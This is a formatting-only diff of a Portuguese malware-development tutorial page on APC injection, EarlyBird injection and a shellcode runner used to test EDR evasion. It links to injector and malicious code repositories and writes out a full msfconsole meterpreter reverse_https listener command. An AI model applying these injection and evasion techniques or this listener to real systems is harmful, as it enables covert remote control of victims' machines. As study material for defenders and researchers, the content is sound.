@@ -139,8 +139,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 <li><code>MsgWaitForMultipleObjectsEx</code></li>
 <li><code>WaitForMultipleObjectsEx</code></li>
 <li><code>WaitForSingleObjectEx</code></li>
-</ul>
-</blockquote>
+</ul></blockquote>
 <p>Um problema relacionado ao uso dessa técnica é que seu uso pode resultar em um crash da aplicação injetada. Podemos tentar diminuir a probabilidade de crashes ao limitar a quantidade de threads para as quais o shellcode deverá ser enfileirado.</p>
 <p>Para testarmos na prática a eficácia da técnica APC Injection, utilizaremos a solução do Visual Studio disponível no meu <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Examples/APC%20Injector">Github</a> e utilizaremos o <em>explorer.exe</em> como alvo da nossa técnica.</p>
 <p>Vamos, primeiramente, fazer um <em>walthrough</em> pelo código do injetor.</p>
@@ -294,8 +293,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 <p>Para ilustrarmos a efetividade do uso de APCs em cenários de evasão de defesas, iremos testar uma variação de injeção chamado EarlyBird, ou, &ldquo;O madrugador&rdquo;.</p>
 <p>O EarlyBird tem esse nome devido ao modo como a APC é injetada no processo-alvo. Sua vantagem com relação à técnica descrita na seção anterior é que não é necessário que um processo esteja rodando e tenha uma thread que entre em modo alertable para que ele seja vítima. Para isso, o injetor irá criar um processo em modo suspenso - em que a thread principal ainda não iniciou - configurar e enfileirar a função maliciosa e ela sempre irá rodar, visto que APCs também são executadas assim que um processo criado em modo suspenso é resumido.</p>
 <blockquote>
-<p>Por criar um processo em modo suspenso, a injeção EarlyBird pode ter um nível de detecção maior soluções mais sofisticadas, como EDRs.</p>
-</blockquote>
+<p>Por criar um processo em modo suspenso, a injeção EarlyBird pode ter um nível de detecção maior soluções mais sofisticadas, como EDRs.</p></blockquote>
 <p>Vamos analisar a construção do <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Examples/EarlyBird%20Injector">código</a>.</p>
 <h4 id="earlybird-injector">EarlyBird Injector</h4>
 <p>O código a seguir é uma <em>proof-of-concept</em> da técnica EarlyBird.</p>
@@ -398,8 +396,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 <p>Comando para criar um listener no meterpreter:</p>
 <ul>
 <li><code>msfconsole -x &quot;use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.100.2; set LPORT 443; set EXITFUNC thread; exploit&quot;</code></li>
-</ul>
-</blockquote>
+</ul></blockquote>
 <h3 id="resultados-shellcode-runner">Resultados Shellcode Runner</h3>
 <p>O código do Shellcode Runner utilizado está disponível <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeExecutor">nesse link</a>.</p>
 <p>Como explicado anteriormente, estamos utilizando o Shellcode Runner apenas como ponto de controle. Caso ele não seja detectado, então nossos níveis-padrão de ofuscação e evasão possivelmente são os responsáveis principais por esse resultado, e não as injeções APC. Caso contrário, temos uma boa probabilidade de que as técnicas que não foram detectadas obtiveram sucesso por causa da injeção realizada.</p>
